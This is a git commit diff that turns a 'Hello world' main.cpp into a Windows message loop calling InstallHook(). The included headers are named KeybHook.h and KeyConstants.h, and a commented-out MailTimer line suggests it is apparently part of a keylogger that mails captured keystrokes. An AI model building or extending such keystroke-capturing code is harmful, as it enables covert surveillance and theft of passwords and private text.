832a6758802da5a6bdd14672afb205e72ddc35b2
Satya Pavan <pavan.simham@gmail.com>
2017-11-24 01:02:32 +0530

    some version, not sure if its a working copy, but it surely is a sleepy copy

--- main.cpp
+++ main.cpp
@@ -1,9 +1,22 @@
 #include <iostream>
 
-using namespace std;
+#include "KeybHook.h"
+#include "Helper.h"
+#include "KeyConstants.h"
 
 int main()
 {
-    cout << "Hello world!" << endl;
+    MSG Msg;
+ //   IO::MKDir(IO::GetOurPath(true));
+
+    InstallHook();
+
+    while (GetMessage (&Msg, NULL, 0, 0))
+    {
+        TranslateMessage(&Msg);
+        DispatchMessage(&Msg);
+    }
+
+//    MailTimer.Stop();
     return 0;
 }
